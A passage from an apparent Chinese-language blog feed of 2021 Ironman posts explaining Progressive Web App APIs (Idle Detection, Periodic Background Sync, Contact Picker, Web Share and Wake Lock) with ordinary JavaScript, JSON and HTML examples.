class="string">`Idle change: <span class="subst">$&#123;idleDetector.userState&#125;</span>, <span class="subst">$&#123;idleDetector.screenState&#125;</span>.`</span></span><br><span class="line">      );</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> idleDetector.<span class="title function_">start</span>(&#123;</span><br><span class="line">      <span class="attr">threshold</span>: <span class="number">60000</span>,</span><br><span class="line">      signal,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;IdleDetector is active.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      controller.<span class="title function_">abort</span>();</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;IdleDetector is stopped.&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">120000</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="comment">// Deal with initialization errors like permission denied,</span></span><br><span class="line">    <span class="comment">// running outside of top-level frame, etc.</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">name</span>, err.<span class="property">message</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><p>這也是一個漸進式增強的實際的範例，讓 App 能夠逐步支援更多的功能。</p><p>這個頁面在勾選觸發後，只要在 60 秒不活動後就會清除繪畫的內容。這個應用案例可以想像這成被部署在公眾場合供參觀的使用者塗鴉。</p><p>Demo 連結: <a href="https://idle-detection.glitch.me/">https://idle-detection.glitch.me/</a></p>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 定期背景同步</title>
      <link href="/2021/09/23/progressive-web-application/pwa-background-sync/"/>
      <url>/2021/09/23/progressive-web-application/pwa-background-sync/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-Periodic-Background-Sync-API"><a href="#什麼是-Periodic-Background-Sync-API" class="headerlink" title="什麼是 Periodic Background Sync API"></a>什麼是 Periodic Background Sync API</h2><p>透過在 service worker 搭配 Periodic Background Sync API 就可以做到定期背景同步資料的效果。</p><p>背景同步資料可以解決什麼問題，Progressive Web App 說穿了也只是網站，所以當遇到連線不良的時候總是會影響操作體驗。</p><p>一個正常的使用者歷程：</p><ol><li>從口袋裡拿出手機</li><li>使用一下 App 達成目的</li><li>關閉手機</li></ol><p>在這樣的歷程中，尤其在連假坐火車返鄉時，網頁經常因為網路不良而轉圈圈或中斷。如果是重要的訊息我們會願意等待一段時間後又再次重新整理，但很可能又再次落空，這樣的體驗會是我們想要的嗎?</p><p>Service Worker 雖然讓用戶可以透過快取內容來解決網路問題，但是當頁面需要新資料的時候呢？在沒有任何處置前，我們只會收到網路不穩連線逾時請重試，這依舊是一個不好的體驗，透過定期背景同步資料的 API 可以優化這樣的體驗。</p><p>優化過後的使用者歷程會可能像下面這樣:</p><ol><li>閱讀任何文章</li><li>斷線</li><li>點擊另一篇文章</li><li>知頁面載入失敗</li><li>同意通知</li><li>關閉瀏覽器 (App)</li><li>恢復網路</li><li>當文章下載、快取後並準備好時就會收到通知</li></ol><p>以上的情境 Google 有提供舊版 API 的教學並提供的 Demo 影片如下:</p><iframe width="560" height="315" src="https://www.youtube.com/embed/oiVyIT7ljC0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="怎麼使用定期背景同步資料"><a href="#怎麼使用定期背景同步資料" class="headerlink" title="怎麼使用定期背景同步資料"></a>怎麼使用定期背景同步資料</h2><p>早期是透過 <code>SyncManager.register()</code> 可以做到，不過這樣的做法直到目前都還不是標準，也不建議被使用，不過漸進式增強的寫法如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;serviceWorker&quot;</span> <span class="keyword">in</span> navigator &amp;&amp; <span class="string">&quot;SyncManager&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>) &#123;</span><br><span class="line">  navigator.<span class="property">serviceWorker</span>.<span class="property">ready</span></span><br><span class="line">    .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">reg</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> reg.<span class="property">sync</span>.<span class="title function_">register</span>(<span class="string">&quot;tag-name&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="comment">// 註冊 SyncManager 失敗</span></span><br><span class="line">      <span class="title function_">postDataFromThePage</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 不支援</span></span><br><span class="line">  <span class="title function_">postDataFromThePage</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外一個支援度較高的方式是透過 <code>ServiceWorkerRegistration.periodicSync.register()</code>。</p><p>相關標準如連結: <a href="https://wicg.github.io/periodic-background-sync/">https://wicg.github.io/periodic-background-sync/</a></p><p>使用上的流程也是不難，只要瀏覽器有這個 API 可以使用就可以用，不過為了防呆還是建議寫上 try catch。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先抓出來 registration</span></span><br><span class="line"><span class="keyword">const</span> registration = <span class="keyword">await</span> navigator.<span class="property">serviceWorker</span>.<span class="property">ready</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判斷有沒有這個 API</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;periodicSync&quot;</span> <span class="keyword">in</span> registration) &#123;</span><br><span class="line">  <span class="comment">// 拿出來會是一個物件</span></span><br><span class="line">  <span class="keyword">const</span> periodicSync = registration.<span class="property">periodicSync</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用流程如下:</p><ol><li>查看權限</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> status = <span class="keyword">await</span> navigator.<span class="property">permissions</span>.<span class="title function_">query</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;periodic-background-sync&quot;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">if</span> (status.<span class="property">state</span> === <span class="string">&quot;granted&quot;</span>) &#123;</span><br><span class="line">  <span class="comment">// 可以使用</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 需要權限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>註冊事件，並給予一個 tag 辨識，底下的例子為 <code>get-latest-news</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">registerPeriodicNewsCheck</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> registration = <span class="keyword">await</span> navigator.<span class="property">serviceWorker</span>.<span class="property">ready</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> registration.<span class="property">periodicSync</span>.<span class="title function_">register</span>(<span class="string">&quot;get-latest-news&quot;</span>, &#123;</span><br><span class="line">      <span class="attr">minInterval</span>: <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;不支援&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看是否註冊成功</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">serviceWorker</span>.<span class="property">ready</span>.<span class="title function_">then</span>(<span class="function">(<span class="params">registration</span>) =&gt;</span> &#123;</span><br><span class="line">  registration.<span class="property">periodicSync</span>.<span class="title function_">getTags</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">tags</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tags.<span class="title function_">includes</span>(<span class="string">&quot;get-latest-news&quot;</span>)) &#123;</span><br><span class="line">      <span class="comment">// 成功就跳過某些流程</span></span><br><span class="line">      <span class="title function_">skipDownloadingLatestNewsOnPageLoad</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="4"><li>監聽並處理剛才註冊的事件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">updateArticles</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> articlesCache = <span class="keyword">await</span> caches.<span class="title function_">open</span>(<span class="string">&quot;articles&quot;</span>);</span><br><span class="line">  <span class="keyword">await</span> articlesCache.<span class="title function_">add</span>(<span class="string">&quot;/api/articles&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;periodicsync&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">tag</span> == <span class="string">&quot;get-latest-news&quot;</span>) &#123;</span><br><span class="line">    event.<span class="title function_">waitUntil</span>(<span class="title function_">updateArticles</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="5"><li>取消註冊的事件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">serviceWorker</span>.<span class="property">ready</span>.<span class="title function_">then</span>(<span class="function">(<span class="params">registration</span>) =&gt;</span> &#123;</span><br><span class="line">  registration.<span class="property">periodicSync</span>.<span class="title function_">unregister</span>(<span class="string">&quot;get-latest-news&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 存取通訊錄聯絡人</title>
      <link href="/2021/09/22/progressive-web-application/pwa-contact-picker/"/>
      <url>/2021/09/22/progressive-web-application/pwa-contact-picker/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-Contact-Picker-API"><a href="#什麼是-Contact-Picker-API" class="headerlink" title="什麼是 Contact Picker API"></a>什麼是 Contact Picker API</h2><p>透過 Contact Picker API 網頁也可以像 Native App 一樣去選取用戶的聯絡人資訊，API 提供開發者去選擇一個或多個欄位資訊，反過來說 App 可以設計讓用戶只分享他們想分享的內容，更方便用戶去和家人、朋友做互動。舉例來說 Email 的 Progressive Web App 就可以整合 Contact Picker API 來選擇 Email 的收信人，或是有社群功能的網站可以幫助用戶知道哪些聯絡人已經加入。</p><p>底下連結是按照教學文件中去製作出來的 Demo 網站，建議使用 Android M 以上手機開啟 Chrome 80+ 版本才能正常運作。<br><a href="https://linyencheng.github.io/pwa-contact-picker/">https://linyencheng.github.io/pwa-contact-picker/</a></p><h2 id="怎麼使用-Contact-Picker-API"><a href="#怎麼使用-Contact-Picker-API" class="headerlink" title="怎麼使用 Contact Picker API"></a>怎麼使用 Contact Picker API</h2><ol><li>Progressive Web App 的第一步驟就是要檢查是否支持 Contact Picker API，請使用：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> supported = <span class="string">&quot;contacts&quot;</span> <span class="keyword">in</span> navigator &amp;&amp; <span class="string">&quot;ContactsManager&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用上 Contact Picker API 有兩個參數 properties, options。</li></ol><ul><li>properties: [‘name’, ‘email’, ‘tel’, ‘address’, ‘icon’]<ul><li>addresses、icons 需要 Chrome 84+</li></ul></li><li>options: <code>&#123; multiple: true &#125;</code> 是否多選</li></ul><p>Contact Picker API 的使用方式是直接使用 <code>navigator.contacts.select()</code>，當被叫用後會回傳一個 promise 並顯示聯絡人選擇器介面，使用者就能透過介面去選擇想要透過網站分享的聯絡人。選擇並點擊完成後，promise 就會把資料帶回來。</p><p>程式碼也很簡單，關鍵步驟如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> properties = [<span class="string">&quot;name&quot;</span>, <span class="string">&quot;email&quot;</span>, <span class="string">&quot;tel&quot;</span>, <span class="string">&quot;address&quot;</span>, <span class="string">&quot;icon&quot;</span>];</span><br><span class="line"><span class="keyword">const</span> options = &#123; <span class="attr">multiple</span>: <span class="literal">true</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> contacts = <span class="keyword">await</span> navigator.<span class="property">contacts</span>.<span class="title function_">select</span>(properties, options);</span><br><span class="line">  <span class="title function_">handleResults</span>(contacts);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ex) &#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>聯絡人選擇器介面 (圖片來源: <a href="https://web.dev/">https://web.dev/</a>)<br><img src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/EiHIOYdno52DZ6TNHcfI.jpg?auto=format&w=845" alt="聯絡人選擇器介面"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 透過系統分享內容</title>
      <link href="/2021/09/21/progressive-web-application/pwa-web-share/"/>
      <url>/2021/09/21/progressive-web-application/pwa-web-share/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-Web-Share-API"><a href="#什麼是-Web-Share-API" class="headerlink" title="什麼是 Web Share API"></a>什麼是 Web Share API</h2><p>Web App 透過 Web Share API 就能夠使用系統提供的分享功能，將連結、內容和文件分享給安裝在裝置上的其他應用 App。另外一方面只要透過將 App 配置 Web Share Target 相關設定也能夠接收其他 App 分享的內容。</p><h2 id="怎麼使用-Web-Share-API"><a href="#怎麼使用-Web-Share-API" class="headerlink" title="怎麼使用 Web Share API"></a>怎麼使用 Web Share API</h2><p>用法上也是很簡單，也是只要瀏覽器有支援 <code>navigator.share</code> 這個 API 就可以使用。使用上需注意</p><ul><li>只能在 HTTPS 環境</li><li>只能透過用戶動作觸發</li><li>支援 URLs、text、files.</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一般分享</span></span><br><span class="line"><span class="keyword">if</span> (navigator.<span class="property">share</span>) &#123;</span><br><span class="line">  navigator</span><br><span class="line">    .<span class="title function_">share</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;標題&quot;</span>,</span><br><span class="line">      <span class="attr">text</span>: <span class="string">&quot;內文&quot;</span>,</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&quot;https://hello.share/&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;成功&quot;</span>))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;失敗&quot;</span>, error));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分享檔案</span></span><br><span class="line"><span class="keyword">if</span> (navigator.<span class="property">canShare</span> &amp;&amp; navigator.<span class="title function_">canShare</span>(&#123; <span class="attr">files</span>: filesArray &#125;)) &#123;</span><br><span class="line">  navigator</span><br><span class="line">    .<span class="title function_">share</span>(&#123;</span><br><span class="line">      <span class="attr">files</span>: filesArray,</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;標題&quot;</span>,</span><br><span class="line">      <span class="attr">text</span>: <span class="string">&quot;內文&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;成功&quot;</span>))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;失敗&quot;</span>, error));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`不支援檔案分享`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置-Web-Share-Target"><a href="#配置-Web-Share-Target" class="headerlink" title="配置 Web Share Target"></a>配置 Web Share Target</h2><p>前面說明了怎麼把內容透過 Web Share API 分享到其他的 App，現在則是透過 Web Share Target 相關配置來讓 Progressive Web App 能接收其他 App 分享的內容。</p><p>實作上也不困難，我們需要多實作一個頁面用來接收分享的內容，並且在 manifest 中加入相關配置，以下的例子就是 <code>target.html</code>，method 預設會是 <code>GET</code> 內容預設編碼是 <code>application/x-www-form-urlencoded</code>。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;short_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Share&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Share Target Test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;share_target&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;target.html&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;title&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;url&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="comment">// 其他省略</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在接收到分享後，瀏覽器會透過 URL-encoded 將相關參數編碼並帶入 action URL 中 <code>?title=hello&amp;text=world</code>，接著我們在 <code>target.html</code> 就可以透過相關程式進行處理。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>window.location<span class="tag">&lt;/<span class="name">code</span>&gt;</span>:<span class="tag">&lt;/<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">code</span> <span class="attr">id</span>=<span class="string">&quot;href&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">b</span>&gt;</span>Title:<span class="tag">&lt;/<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">code</span> <span class="attr">id</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">b</span>&gt;</span>Text:<span class="tag">&lt;/<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">code</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">b</span>&gt;</span>URL:<span class="tag">&lt;/<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">code</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;href&quot;</span>).<span class="property">textContent</span> = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> parsedUrl = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="variable language_">window</span>.<span class="property">location</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;title&quot;</span>).<span class="property">textContent</span> =</span></span><br><span class="line"><span class="language-javascript">      parsedUrl.<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&quot;title&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">textContent</span> =</span></span><br><span class="line"><span class="language-javascript">      parsedUrl.<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&quot;text&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;url&quot;</span>).<span class="property">textContent</span> =</span></span><br><span class="line"><span class="language-javascript">      parsedUrl.<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&quot;url&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Google 的教學文件中，提供了下面這個 Demo 站台，使用上:</p><ol><li>安裝</li><li>按分享並選擇剛剛安裝的 App<blockquote><p>圖片來源: <a href="https://web-dev/">https://web-dev</a><br><img src="https://web-dev.imgix.net/image/admin/Q4nuOQMpsQrTilpXA3fL.png?auto=format&w=439"></p></blockquote></li><li>會開啟 App 中的 <code>target.html</code> 頁面並顯示相關分享內容<blockquote><p>圖片來源: <a href="https://web-dev/">https://web-dev</a><br><img src="https://web-dev.imgix.net/image/admin/hSwbgPk8IFgPC81oJbxZ.png?auto=format&w=439"></p></blockquote></li></ol><p>站台連結: <a href="https://web-share.glitch.me/">https://web-share.glitch.me/</a></p>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 喚醒鎖</title>
      <link href="/2021/09/20/progressive-web-application/pwa-wake-lock/"/>
      <url>/2021/09/20/progressive-web-application/pwa-wake-lock/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是喚醒鎖-Screen-Wake-Lock-API"><a href="#什麼是喚醒鎖-Screen-Wake-Lock-API" class="headerlink" title="什麼是喚醒鎖 (Screen Wake Lock API)?"></a>什麼是喚醒鎖 (Screen Wake Lock API)?</h2><p>喚醒鎖 (Screen Wake Lock API) 讓 App 不會因為省電設定而關閉螢幕，透過這樣的設計 App 有了更多的彈性。舉例來說:</p><ul><li>食譜的 App 就會需要在烹煮的過程中持續顯示</li><li>QR code 票證應該要在被掃描後螢幕才能被關閉</li><li>投影片展示過程中螢幕應該維持開啟</li></ul><h2 id="怎麼使用喚醒鎖-Screen-Wake-Lock-API"><a href="#怎麼使用喚醒鎖-Screen-Wake-Lock-API" class="headerlink" title="怎麼使用喚醒鎖 (Screen Wake Lock API)"></a>怎麼使用喚醒鎖 (Screen Wake Lock API)</h2><p>使用上也沒有特別複雜，步驟如下</p><ol><li>首先看是否支援，有存在這個 API 就代表支援，支援度可<a href="https://developer.mozilla.org/en-US/docs/Web/API/WakeLock">參考 MDN</a></li><li>透過 wakeLock.request() 去拿回並啟動喚醒鎖</li><li>透過喚醒鎖的 released 狀態去偵測是否啟動</li><li>透過 wakeLock.release() 去釋放喚醒鎖</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 首先看是否支援，有存在這個 API 就代表支援</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;wakeLock&quot;</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">  <span class="keyword">let</span> wakeLock = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">requestWakeLock</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 2. 透過 wakeLock.request() 去啟動喚醒鎖</span></span><br><span class="line">      wakeLock = <span 